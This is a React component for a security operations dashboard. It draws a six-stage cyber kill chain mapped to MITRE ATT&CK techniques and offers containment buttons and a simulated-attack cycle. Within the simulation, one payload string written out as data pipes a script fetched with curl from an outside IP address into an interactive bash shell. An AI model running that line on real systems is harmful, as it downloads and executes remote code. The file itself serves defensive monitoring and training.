/**
 * AttackChainGraph.jsx — Interactive Cyber Kill-Chain Visualizer & Active SOAR Command Grid
 *
 * Enterprise-grade 6-stage Kill-Chain visualizer aligning with Lockheed Martin & MITRE ATT&CK:
 *  1. Recon & Ingress Origin (Attacker IP, Geo, ISP)
 *  2. Delivery & Weaponization (Exploit Payload, Protocol)
 *  3. Initial Foothold & Process Execution (Compromised PID, Shell Command)
 *  4. Privilege Escalation & Persistence (Sudo / Admin Elevation)
 *  5. Defense Evasion & Lateral Movement (Honeytoken & Decoy Canaries)
 *  6. C2 & Exfiltration Target (C2 Beaconing, Targeted Asset)
 *
 * Dynamic State Machine:
 *  - When an attack is happening (simulation started or live breach):
 *      Buttons & indicators turn glowing RED (active attack / threat spreading).
 *  - When SOAR Automation intercepts & kills the attack:
 *      Buttons & indicators turn vibrant GREEN (safe state / threat neutralized).
 */
import { useState, useEffect, useMemo, useRef } from 'react';
import {
  GitBranch,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Zap,
  Lock,
  Skull,
  Server,
  Terminal,
  Database,
  ArrowRight,
  AlertTriangle,
  Flame,
  Radio,
  ExternalLink,
  ChevronRight,
  RotateCcw,
  Sparkles,
  Info,
  CheckCircle2,
  XCircle,
  Play,
} from 'lucide-react';
import toast from 'react-hot-toast';
import { defenseApi, incidentApi, threatApi } from '@/services/api';
import { useSocket } from '@/context/SocketContext';
import { tacticalAudio } from '@/utils/tacticalAudio';

export default function AttackChainGraph({ onOpenSimulator, onAttackStateChange, resetSignal }) {
  const { lastFinding, subscribe } = useSocket();
  const [incidents, setIncidents] = useState([]);
  const [selectedIncidentId, setSelectedIncidentId] = useState('live_feed');
  const [recentThreats, setRecentThreats] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedNodeIndex, setSelectedNodeIndex] = useState(2); // Default to Process stage

  // Containment states: campaignId -> { blocked: bool, killed: bool, isolated: bool, rearmed: bool }
  const [containmentStates, setContainmentStates] = useState({});
  const [executingAction, setExecutingAction] = useState(null);
  const [simulating, setSimulating] = useState(false);

  // Attack cycle state: 'idle' | 'attack' | 'mitigating' | 'safe'
  const [attackState, setAttackState] = useState('idle');
  const timersRef = useRef([]);

  // Ref to always hold the current activeKey — fixes stale closure in socket handlers
  const activeKeyRef = useRef('live_feed');

  // When parent resets to idle (e.g. header Safe—Reset button), clear all containment flags
  useEffect(() => {
    if (!resetSignal) return; // 0 = initial mount, skip
    setAttackState('idle');
    setContainmentStates({});
  }, [resetSignal]);

  // Notify parent (DashboardPage header) whenever attackState changes
  useEffect(() => {
    if (typeof onAttackStateChange === 'function') {
      onAttackStateChange(attackState);
    }
  }, [attackState, onAttackStateChange]);

  // Clear timers on unmount
  useEffect(() => {
    return () => {
      timersRef.current.forEach(clearTimeout);
    };
  }, []);

  // Fetch initial incidents and recent threats
  const fetchData = async () => {
    try {
      setLoading(true);
      const [incRes, threatRes] = await Promise.all([
        incidentApi.list({ limit: 8 }).catch(() => ({ data: {} })),
        threatApi.list({ limit: 10 }).catch(() => ({ data: {} })),
      ]);

      const incs = incRes.data?.data?.incidents || [];
      const thrs = threatRes.data?.data?.threats || [];

      setIncidents(incs);
      setRecentThreats(thrs);
    } catch {
      // Handled gracefully
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
  }, []);

  // Listen for live socket threats
  useEffect(() => {
    if (!lastFinding) return;
    setRecentThreats((prev) => [lastFinding, ...prev.slice(0, 9)]);
    tacticalAudio.playRadarPing();

    // New critical/high threat → if not already in safe state, go to 'attack'
    // If currently idle (no prior simulation), go to 'unsafe' instead
    // to distinguish live threat vs simulated one
    if (lastFinding.severity === 'critical' || lastFinding.severity === 'high') {
      setAttackState((prev) => {
        // If we're already in a simulation cycle, keep 'attack'
        if (prev === 'attack' || prev === 'mitigating') return prev;
        // If safe or idle, flag as 'unsafe' (live threat, not simulated)
        return prev === 'idle' ? 'unsafe' : 'attack';
      });
      setContainmentStates((prev) => ({
        ...prev,
        [activeKeyRef.current]: { blocked: false, killed: false, isolated: false, rearmed: false },
      }));
    }
  }, [lastFinding]);

  // Listen for automated defense actions executed over Socket.IO
  useEffect(() => {
    if (!subscribe) return;
    const unsubExecuted = subscribe('defense:action:executed', (action) => {
      if (!action) return;
      const key = activeKeyRef.current;
      tacticalAudio.playNeutralized();
      setContainmentStates((prev) => ({
        ...prev,
        [key]: {
          ...prev[key],
          [action.actionType]: true,
          killed: action.actionType === 'kill_process' ? true : prev[key]?.killed,
          blocked: action.actionType === 'block_ip' ? true : prev[key]?.blocked,
          isolated: action.actionType === 'isolate_host' ? true : prev[key]?.isolated,
          rearmed: action.actionType === 'quarantine_file' ? true : prev[key]?.rearmed,
        },
      }));
      setAttackState('safe');
      toast.success(`🛡️ SOAR Automation Enforced: ${action.actionType?.replace(/_/g, ' ').toUpperCase()} · Safe State`);
    });

    const unsubConfirmed = subscribe('defense:action:confirmed', (receipt) => {
      if (!receipt?.actionType) return;
      const key = activeKeyRef.current;
      // Map actionType to the relevant containment flag
      const actionFlagMap = {
        kill_process: 'killed',
        block_ip: 'blocked',
        isolate_host: 'isolated',
        quarantine_file: 'rearmed',
        rearm_honeytoken: 'rearmed',
      };
      const flagKey = actionFlagMap[receipt.actionType] || receipt.actionType;
      setContainmentStates((prev) => ({
        ...prev,
        [key]: {
          ...prev[key],
          [receipt.actionType]: true,
          [flagKey]: true,
        },
      }));
      setAttackState('safe');
      toast.success(`🤖 Autopilot Confirmed: ${receipt.actionType?.replace(/_/g, ' ').toUpperCase()} · System Secured`);
    });

    return () => {
      unsubExecuted();
      unsubConfirmed();
    };
  }, [subscribe]);

  // Derive dynamic kill-chain model based on the selected incident or live threat
  const activeChain = useMemo(() => {
    let sourceThreat = recentThreats[0] || {};
    let title = 'Live Endpoint Ingress Sequence';
    let severity = 'critical';

    if (selectedIncidentId !== 'live_feed') {
      const foundInc = incidents.find((i) => i._id === selectedIncidentId);
      if (foundInc) {
        title = foundInc.title || 'Correlated Incident Campaign';
        severity = foundInc.severity || 'high';
        sourceThreat = foundInc.threatIds?.[0] || sourceThreat;
      }
    } else if (recentThreats.length > 0) {
      sourceThreat = recentThreats[0];
      title = `Real-time Telemetry: ${sourceThreat.type || 'Host Alert'}`;
      severity = sourceThreat.severity || 'critical';
    }

    const attackerIp = sourceThreat.source?.ip || sourceThreat.geo?.ip || '185.193.65.19';
    const loc = sourceThreat.geo?.country
      ? `${sourceThreat.geo?.city ? sourceThreat.geo.city + ', ' : ''}${sourceThreat.geo.country}`
      : 'Moscow, Russia (Bulletproof Gateway)';
    const isp = sourceThreat.geo?.isp || 'Cloud Hosting AS16276';
    const pid = sourceThreat.source?.pid || 8821;
    const processName = sourceThreat.source?.processName || (sourceThreat.type === 'honeytoken_breached' ? 'python3 -c import os' : 'drill_payload.exe');
    const technique = sourceThreat.mitreTechnique || 'T1059.004';
    const rawEvidence = Array.isArray(sourceThreat.evidence) && sourceThreat.evidence[0]
      ? sourceThreat.evidence[0]
      : sourceThreat.description || 'Remote reverse shell connection established via unauthorized socket';

    return {
      id: selectedIncidentId,
      title,
      severity,
      attackerIp,
      attackerLocation: loc,
      attackerIsp: isp,
      protocol: 'TCP / 443 ➔ 5050 (Reverse Payload)',
      pid,
      processName,
      technique,
      rawEvidence,
      targetAsset: 'Primary Sensor: soc-collector-01',
    };
  }, [selectedIncidentId, incidents, recentThreats]);

  const activeKey = activeChain.id;
  // Keep ref in sync with state so socket closures always read the current key
  activeKeyRef.current = activeKey;
  const state = containmentStates[activeKey] || {};

  // Determine overall safe state
  const isSafe = attackState === 'safe' || Boolean(state.killed && (state.blocked || state.isolated));
  const isAttackHappening = attackState === 'attack' || attackState === 'unsafe' || (!isSafe && recentThreats.length > 0 && !state.killed);

  // Build the 6 sequential stages of the attack kill-chain
  const stages = useMemo(() => [
    {
      index: 0,
      stageNumber: '01',
      name: 'Recon & Ingress',
      tactic: 'Reconnaissance / Initial Access',
      mitre: 'T1595 / T1190',
      status: (isSafe || state.blocked) ? 'neutralized' : 'active',
      statusLabel: (isSafe || state.blocked) ? 'IP BLOCKED' : 'MALICIOUS',
      title: activeChain.attackerIp,
      subtitle: activeChain.attackerLocation,
      detail: `Originator IP: ${activeChain.attackerIp} (${activeChain.attackerIsp}). External automated probe searching for vulnerable exposed services.`,
      actionLabel: (isSafe || state.blocked) ? 'Firewall Drop Active ✓' : 'Block IP via SOAR',
      actionType: 'block_ip',
      target: activeChain.attackerIp,
      icon: Skull,
      color: 'red',
    },
    {
      index: 1,
      stageNumber: '02',
      name: 'Weaponization',
      tactic: 'Execution / Ingress Payload',
      mitre: 'T1203 / T1059',
      status: (isSafe || state.blocked) ? 'mitigated' : 'active',
      statusLabel: (isSafe || state.blocked) ? 'INTERCEPTED' : 'EXPLOITED',
      title: 'Malicious Web Vector',
      subtitle: activeChain.protocol,
      detail: `Injected command sequence encapsulated in HTTP POST. Technique: ${activeChain.technique}. WAF filter anomaly detected.`,
      actionLabel: null,
      icon: Server,
      color: 'amber',
    },
    {
      index: 2,
      stageNumber: '03',
      name: 'Host Execution',
      tactic: 'Execution',
      mitre: 'T1059.004',
      status: (isSafe || state.killed) ? 'neutralized' : 'active',
      statusLabel: (isSafe || state.killed) ? 'TERMINATED' : 'EXECUTING',
      title: `PID: ${activeChain.pid}`,
      subtitle: activeChain.processName,
      detail: `Local interpreter spawned child process: "${activeChain.processName}" (PID ${activeChain.pid}). High entropy execution string observed.`,
      actionLabel: (isSafe || state.killed) ? 'Process Killed ✓' : 'SIGKILL Process Tree',
      actionType: 'kill_process',
      target: `PID: ${activeChain.pid}`,
      icon: Terminal,
      color: 'orange',
    },
    {
      index: 3,
      stageNumber: '04',
      name: 'Privilege Escalation',
      tactic: 'Privilege Escalation',
      mitre: 'T1548.003 (Sudo Rights)',
      status: (isSafe || state.killed) ? 'prevented' : 'warning',
      statusLabel: (isSafe || state.killed) ? 'BLOCKED' : 'ATTEMPTED',
      title: 'Elevated Tokens',
      subtitle: 'uid=0(root) gid=0(wheel)',
      detail: 'Adversary attempted sudo credential verification and PAM authentication bypass to attain administrator root privileges.',
      actionLabel: null,
      icon: ShieldAlert,
      color: 'purple',
    },
    {
      index: 4,
      stageNumber: '05',
      name: 'Defense Evasion',
      tactic: 'Credential Access',
      mitre: 'T1552.001 (Honeytoken Breach)',
      status: (isSafe || state.rearmed) ? 'neutralized' : (state.isolated ? 'quarantined' : 'active'),
      statusLabel: (isSafe || state.rearmed) ? 'DECOY RESET' : 'CANARY BREACHED',
      title: '~/.eye/canary.env',
      subtitle: 'AWS Decoy Honeytoken Accessed',
      detail: 'Unsolicited access to decoy AWS credentials detected. Honeytoken canary tripwire tripped! Legitimate software never touches this decoy file.',
      actionLabel: (isSafe || state.rearmed) ? 'Canary Armed ✓' : 'Reset Decoy Honeytoken',
      actionType: 'rearm_honeytoken',
      target: '~/.eye/canary.env',
      icon: Zap,
      color: 'yellow',
    },
    {
      index: 5,
      stageNumber: '06',
      name: 'C2 & Exfiltration',
      tactic: 'Command & Control',
      mitre: 'T1071.001 (C2 Beacon)',
      status: (isSafe || state.isolated) ? 'neutralized' : 'critical',
      statusLabel: (isSafe || state.isolated) ? 'ISOLATED' : 'ACTIVE BEACON',
      title: activeChain.targetAsset,
      subtitle: 'Port 4444 C2 Beaconing',
      detail: `Outbound socket connection to external Command & Control beacon. Targeted asset: ${activeChain.targetAsset}.`,
      actionLabel: (isSafe || state.isolated) ? 'Host Isolated ✓' : 'Isolate Host Network',
      actionType: 'isolate_host',
      target: activeChain.targetAsset,
      icon: Database,
      color: 'cyan',
    },
  ], [activeChain, state, isSafe]);

  // Execute active countermeasure (manual click)
  const handleContainment = async (actionType, target, label) => {
    try {
      setExecutingAction(actionType);
      const res = await defenseApi.contain({
        actionType: actionType === 'rearm_honeytoken' ? 'quarantine_file' : actionType,
        target,
        reason: `SOAR Kill-Chain Countermeasure: ${actionType} triggered from Dashboard`,
        incidentId: selectedIncidentId !== 'live_feed' ? selectedIncidentId : null,
        executedBy: 'analyst',
      });

      if (res.data?.status === 'success') {
        tacticalAudio.playNeutralized();
        toast.success(`🛡️ Countermeasure Enforced: ${label}`);
        setContainmentStates((prev) => {
          const updated = {
            ...prev,
            [activeKey]: {
              ...prev[activeKey],
              [actionType]: true,
            },
          };
          return updated;
        });

        // If process killed or IP blocked, set safe state (turning buttons green)
        if (actionType === 'kill_process' || actionType === 'block_ip') {
          setAttackState('safe');
        }
      }
    } catch (err) {
      toast.error(`Countermeasure failed: ${err.response?.data?.message || err.message}`);
    } finally {
      setExecutingAction(null);
    }
  };

  // Reset from safe/unsafe back to idle (clear all green indicators)
  const handleResetToIdle = () => {
    timersRef.current.forEach(clearTimeout);
    timersRef.current = [];
    setAttackState('idle');
    setContainmentStates((prev) => ({
      ...prev,
      [activeKeyRef.current]: { blocked: false, killed: false, isolated: false, rearmed: false },
    }));
    toast('🔄 State reset — system returned to idle monitoring mode.', { icon: '⬜', duration: 2500 });
  };

  // Full Attack Simulation & Automation Kill-Chain Cycle
  const handleQuickSimulate = async () => {
    // If currently in safe state, first click resets to idle so user sees clean slate
    if (isSafe) {
      handleResetToIdle();
      return;
    }
    try {
      timersRef.current.forEach(clearTimeout);
      timersRef.current = [];

      setSimulating(true);
      // 1. Attack Starts -> Turn everything RED!
      setAttackState('attack');
      setContainmentStates((prev) => ({
        ...prev,
        [activeKey]: { blocked: false, killed: false, isolated: false, rearmed: false },
      }));

      tacticalAudio.playAlarm();
      toast('🚨 ATTACK DETECTED: Synthetic multi-stage exploit detonated on host!', {
        icon: '⚡',
        duration: 4000,
      });

      const simIp = '185.193.65.' + Math.floor(Math.random() * 200 + 10);
      const simPid = Math.floor(Math.random() * 8000 + 1000);

      await threatApi.simulate({
        type: 'command_injection',
        severity: 'critical',
        sourceIp: simIp,
        sourcePid: simPid,
        description: `Simulated APT29 command injection & reverse shell beacon (PID ${simPid})`,
        payload: 'curl -s http://185.193.65.19/drill.sh | bash -i',
      });

      await fetchData();

      // 2. Automation Engages after progression window
      const t1 = setTimeout(() => {
        setAttackState('mitigating');
        toast('⚡ SOAR Automation Triggered: Intercepting process tree & enforcing blocklist...', {
          icon: '🛡️',
          duration: 2500,
        });
      }, 1600);
      timersRef.current.push(t1);

      // 3. Automation KILLS the attack -> State becomes SAFE, ALL BUTTONS TURN GREEN!
      const t2 = setTimeout(async () => {
        try {
          await Promise.allSettled([
            defenseApi.contain({
              actionType: 'kill_process',
              target: String(simPid),
              reason: 'SOAR Autonomous Process Termination (Kill-Chain Mitigated)',
              executedBy: 'automation',
            }),
            defenseApi.contain({
              actionType: 'block_ip',
              target: simIp,
              reason: 'SOAR Autonomous Ingress Drop (IP Blocked)',
              executedBy: 'automation',
            }),
          ]);

          // Set all containment flags to true (Safe State)
          setContainmentStates((prev) => ({
            ...prev,
            [activeKey]: { blocked: true, killed: true, isolated: true, rearmed: true },
          }));

          setAttackState('safe');
          tacticalAudio.playNeutralized();
          toast.success('🛡️ AUTOMATION KILLED ATTACK: Threat neutralized. System in SAFE STATE!', {
            duration: 6000,
          });
        } catch {
          // Fallback safe state
          setContainmentStates((prev) => ({
            ...prev,
            [activeKey]: { blocked: true, killed: true, isolated: true, rearmed: true },
          }));
          setAttackState('safe');
        } finally {
          setSimulating(false);
        }
      }, 3200);
      timersRef.current.push(t2);

    } catch (err) {
      toast.error('Simulation failed: ' + err.message);
      setSimulating(false);
      setAttackState('idle');
    }
  };

  // Status badge style helper
  const getStatusBadge = (status, label) => {
    switch (status) {
      case 'neutralized':
      case 'mitigated':
      case 'prevented':
      case 'quarantined':
        return 'bg-emerald-950/80 border-emerald-500/60 text-emerald-300';
      case 'warning':
        return isSafe
          ? 'bg-emerald-950/80 border-emerald-500/60 text-emerald-300'
          : 'bg-amber-950/70 border-amber-700/60 text-amber-300';
      case 'critical':
      case 'active':
      default:
        return isSafe
          ? 'bg-emerald-950/80 border-emerald-500/60 text-emerald-300'
          : 'bg-red-950/80 border-red-700/80 text-red-300 animate-pulse';
    }
  };

  const activeNode = stages[selectedNodeIndex] || stages[0];

  return (
    <div className="glass-card glow-border p-4 relative overflow-hidden">
      {/* ── Top Header & Threat Level ─────────────────────────────────── */}
      <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
        <div className="flex items-center gap-2.5">
          <div
            className={`p-2 rounded-lg border shadow-sm transition-colors ${
              isSafe
                ? 'bg-emerald-950/60 border-emerald-700/50 text-emerald-400'
                : 'bg-purple-950/60 border-purple-800/40 text-purple-400'
            }`}
          >
            <GitBranch className="w-4 h-4" />
          </div>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <h3 className="text-sm font-semibold text-slate-100 tracking-wide font-mono">
                LIVE KILL-CHAIN ATTACK GRAPH
              </h3>

              {/* Dynamic Status Pill: Green when Safe State, Red when Attack is happening */}
              {isSafe ? (
                <span className="flex items-center gap-1.5 text-[11px] font-mono text-emerald-300 bg-emerald-950/80 px-2.5 py-0.5 rounded-full border border-emerald-500/60 shadow-sm shadow-emerald-950/50">
                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                  CONTAINED &amp; NEUTRALIZED · SAFE STATE
                </span>
              ) : attackState === 'mitigating' ? (
                <span className="flex items-center gap-1.5 text-[11px] font-mono text-amber-300 bg-amber-950/80 px-2.5 py-0.5 rounded-full border border-amber-600/60 shadow-sm animate-pulse">
                  <RotateCcw className="w-3.5 h-3.5 text-amber-400 animate-spin" />
                  AUTOMATION KILLING THREAT...
                </span>
              ) : attackState === 'unsafe' ? (
                <span className="flex items-center gap-1.5 text-[11px] font-mono text-red-300 bg-red-950/90 px-2.5 py-0.5 rounded-full border border-red-600/90 shadow-sm shadow-red-950/60 animate-pulse">
                  <ShieldAlert className="w-3.5 h-3.5 text-red-400 animate-pulse" />
                  LIVE THREAT DETECTED · UNSAFE STATE
                </span>
              ) : (
                <span className="flex items-center gap-1.5 text-[11px] font-mono text-red-300 bg-red-950/80 px-2.5 py-0.5 rounded-full border border-red-700/80 shadow-sm shadow-red-950/50 animate-pulse">
                  <Flame className="w-3.5 h-3.5 text-red-400 animate-pulse" />
                  ACTIVE THREAT CHAIN · STAGE 6 REACHED
                </span>
              )}
            </div>
            <p className="text-[11px] text-slate-400 mt-0.5">
              Lockheed Martin 6-stage MITRE ATT&CK progression with real-time SOAR countermeasures
            </p>
          </div>
        </div>

        {/* Action Controls & Feed Selector */}
        <div className="flex flex-wrap items-center gap-2">
          {/* Campaign Selector */}
          <div className="flex items-center gap-1.5 bg-surface-800/90 px-2.5 py-1 rounded-lg border border-surface-700/70 text-xs">
            <span className="text-slate-500 font-mono text-[11px]">View:</span>
            <select
              value={selectedIncidentId}
              onChange={(e) => setSelectedIncidentId(e.target.value)}
              className="bg-transparent text-slate-200 text-xs font-mono focus:outline-none cursor-pointer"
            >
              <option value="live_feed" className="bg-surface-900 text-cyan-300">
                ⚡ Real-time Telemetry Stream
              </option>
              {incidents.map((inc) => (
                <option key={inc._id} value={inc._id} className="bg-surface-900 text-slate-200">
                  {inc.title?.slice(0, 26)} ({inc.severity})
                </option>
              ))}
            </select>
          </div>

          {/* 
            Simulate Attack Button:
            - RED when attack is happening / simulation started
            - GREEN when safe state after automation killed it
          */}
          <button
            onClick={handleQuickSimulate}
            disabled={simulating}
            className={`px-3 py-1 text-xs font-mono font-bold rounded-lg transition-all flex items-center gap-1.5 shadow-md ${
              attackState === 'attack' || attackState === 'unsafe'
                ? 'bg-red-600 hover:bg-red-500 text-white border border-red-500 shadow-lg shadow-red-950/80 animate-pulse'
                : attackState === 'mitigating'
                ? 'bg-amber-600/30 hover:bg-amber-600/40 text-amber-200 border border-amber-500/50 animate-pulse'
                : isSafe
                ? 'bg-emerald-950/80 hover:bg-emerald-900 text-emerald-300 border border-emerald-500/60 shadow-md shadow-emerald-950/50'
                : 'bg-red-950/80 hover:bg-red-900/90 text-red-200 border border-red-700/70 shadow-sm'
            }`}
            title={isSafe ? 'System safe. Click to simulate new attack.' : 'Inject simulated attack vector'}
          >
            {attackState === 'attack' || attackState === 'unsafe' ? (
              <>
                <Flame className="w-3.5 h-3.5 text-white animate-bounce" />
                <span>{attackState === 'unsafe' ? 'LIVE THREAT — UNSAFE' : 'Attack in Progress...'}</span>
              </>
            ) : attackState === 'mitigating' ? (
              <>
                <RotateCcw className="w-3.5 h-3.5 text-amber-300 animate-spin" />
                <span>Automation Killing Threat...</span>
              </>
            ) : isSafe ? (
              <>
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                <span>Safe State (Simulate Again)</span>
              </>
            ) : (
              <>
                <Zap className="w-3.5 h-3.5 text-red-400" />
                <span>Simulate Attack</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* ── 6-Stage Visual Kill-Chain Track ──────────────────────────── */}
      <div className="bg-[#020617] rounded-xl border border-surface-700/70 p-4 select-none relative overflow-x-auto shadow-inner">
        {/* Radar subtle grid pattern */}
        <div
          className="absolute inset-0 opacity-10 pointer-events-none"
          style={{
            backgroundImage: `radial-gradient(circle at 1px 1px, #38bdf8 1px, transparent 0)`,
            backgroundSize: '20px 20px',
          }}
        />

        <div className="min-w-[980px] flex items-stretch justify-between gap-2 relative z-10 py-1">
          {stages.map((st, i) => {
            const isSelected = selectedNodeIndex === i;
            const isStageNeutralized = isSafe || st.status === 'neutralized' || st.status === 'mitigated' || st.status === 'prevented';

            return (
              <div key={st.index} className="flex-1 flex items-center">
                {/* Stage Node Box */}
                <div
                  onClick={() => setSelectedNodeIndex(i)}
                  className={`w-full rounded-xl border p-3 flex flex-col justify-between cursor-pointer transition-all duration-200 relative group ${
                    isSelected
                      ? isSafe
                        ? 'ring-2 ring-emerald-400 shadow-lg shadow-emerald-950/60 scale-[1.02]'
                        : 'ring-2 ring-cyan-500/80 shadow-lg shadow-cyan-950/50 scale-[1.02]'
                      : 'hover:border-slate-500/80 hover:bg-surface-800/60'
                  } ${
                    isStageNeutralized
                      ? 'bg-emerald-950/20 border-emerald-800/50 text-slate-300'
                      : 'bg-surface-900/90 border-surface-700/80 shadow-md'
                  }`}
                >
                  {/* Top Header */}
                  <div>
                    <div className="flex items-center justify-between mb-1.5">
                      <div className="flex items-center gap-1.5">
                        <span className="font-mono text-[10px] font-bold text-slate-500">
                          {st.stageNumber}
                        </span>
                        <span className="text-xs font-semibold text-slate-200 font-mono tracking-tight">
                          {st.name}
                        </span>
                      </div>
                      <span
                        className={`text-[9px] font-mono px-1.5 py-0.5 rounded border uppercase font-semibold ${getStatusBadge(
                          st.status,
                          st.statusLabel
                        )}`}
                      >
                        {st.statusLabel}
                      </span>
                    </div>

                    <p className="font-mono text-xs font-bold text-slate-100 truncate mt-1">
                      {st.title}
                    </p>
                    <p className="text-[11px] text-slate-400 truncate mt-0.5">
                      {st.subtitle}
                    </p>
                  </div>

                  {/* 
                    Bottom Countermeasure Trigger Button:
                    - GREEN when safe / neutralized
                    - RED when attack is happening
                  */}
                  <div className="mt-3 pt-2 border-t border-surface-800/60">
                    {st.actionLabel ? (
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleContainment(st.actionType, st.target, st.actionLabel);
                        }}
                        disabled={state[st.actionType] || isSafe || executingAction === st.actionType}
                        className={`w-full py-1.5 px-2 rounded text-[10px] font-mono font-semibold flex items-center justify-center gap-1.5 transition-all ${
                          isSafe || state[st.actionType]
                            ? 'bg-emerald-950/80 text-emerald-300 border border-emerald-500/60 shadow-sm shadow-emerald-950/40 cursor-default'
                            : 'bg-red-950/90 hover:bg-red-900 text-red-200 border border-red-700/80 hover:shadow-sm shadow-md shadow-red-950/60 animate-pulse'
                        }`}
                      >
                        {isSafe || state[st.actionType] ? (
                          <CheckCircle2 className="w-3 h-3 text-emerald-400 shrink-0" />
                        ) : (
                          <Zap className="w-2.5 h-2.5 text-red-400 shrink-0" />
                        )}
                        <span className="truncate">{st.actionLabel}</span>
                      </button>
                    ) : (
                      <div className="text-[10px] font-mono text-slate-500 text-center py-1 truncate">
                        {st.mitre}
                      </div>
                    )}
                  </div>
                </div>

                {/* Connecting Arrow between nodes */}
                {i < stages.length - 1 && (
                  <div className="px-1.5 flex flex-col items-center justify-center text-slate-600 shrink-0">
                    <ArrowRight
                      className={`w-3.5 h-3.5 transition-colors ${
                        isSafe
                          ? 'text-emerald-500/60'
                          : isAttackHappening
                          ? 'text-red-400 animate-pulse'
                          : 'text-slate-600'
                      }`}
                    />
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>

      {/* ── Interactive Stage Forensic Inspector ─────────────────────── */}
      <div className="mt-3 p-3.5 bg-surface-900/80 rounded-xl border border-surface-700/60 flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
        <div className="flex items-start gap-3">
          <div
            className={`p-2 rounded-lg border shrink-0 mt-0.5 transition-colors ${
              isSafe
                ? 'bg-emerald-950/40 border-emerald-800/40 text-emerald-400'
                : 'bg-surface-800 border-surface-700 text-cyan-400'
            }`}
          >
            {isSafe ? <ShieldCheck className="w-4 h-4" /> : <Info className="w-4 h-4" />}
          </div>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <span className={`text-xs font-mono font-bold uppercase ${isSafe ? 'text-emerald-400' : 'text-cyan-400'}`}>
                STAGE {activeNode.stageNumber} INSPECTOR · {activeNode.name}
              </span>
              <span className="text-[10px] font-mono px-2 py-0.2 rounded bg-surface-800 border border-surface-700 text-slate-300">
                MITRE {activeNode.mitre}
              </span>
              <span className="text-[10px] font-mono text-slate-500">
                Tactic: {activeNode.tactic}
              </span>
              {isSafe && (
                <span className="text-[10px] font-mono px-2 py-0.2 rounded bg-emerald-950/80 border border-emerald-500/50 text-emerald-300">
                  STATUS: SECURE
                </span>
              )}
            </div>
            <p className="text-xs text-slate-300 mt-1 font-sans">
              {activeNode.detail}
            </p>
          </div>
        </div>

        {/* 
          Bottom Inspector Action Button:
          - GREEN when safe state / countermeasure enforced
          - RED when attack is happening / active countermeasure required
        */}
        {activeNode.actionLabel && (
          <button
            onClick={() => {
              if (!isSafe && !state[activeNode.actionType]) {
                handleContainment(activeNode.actionType, activeNode.target, activeNode.actionLabel);
              }
            }}
            disabled={executingAction === activeNode.actionType}
            className={`shrink-0 px-4 py-2 text-xs font-mono font-bold rounded-lg flex items-center gap-1.5 transition-all shadow-md ${
              isSafe || state[activeNode.actionType]
                ? 'bg-emerald-700 hover:bg-emerald-600 text-white border border-emerald-500 shadow-emerald-950/60 cursor-default'
                : 'bg-red-700 hover:bg-red-600 text-white border border-red-600 shadow-red-950/60 animate-pulse'
            }`}
          >
            {isSafe || state[activeNode.actionType] ? (
              <>
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-200" />
                <span>Countermeasure Enforced · Safe State</span>
              </>
            ) : (
              <>
                <Zap className="w-3.5 h-3.5" />
                <span>Enforce Countermeasure Now</span>
              </>
            )}
          </button>
        )}
      </div>
    </div>
  );
}
